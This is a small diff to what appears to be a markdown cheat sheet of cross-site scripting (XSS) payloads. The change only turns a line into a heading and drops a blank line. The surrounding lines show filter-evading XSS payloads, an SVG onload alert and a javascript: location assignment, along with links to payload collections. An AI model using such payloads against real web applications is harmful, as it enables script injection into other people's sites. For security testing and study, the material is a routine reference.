@@ -114,9 +114,8 @@ https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
 <svg/onload='alert&#40 23 &#41'> 
 location=/javascript:alert%2823%29/.source;
 ```
-20 Chars MAX: 
+### 20 Chars MAX: 
 https://jlajara.gitlab.io/XSS_20_characters
-
 
 ### Alert
 ```js
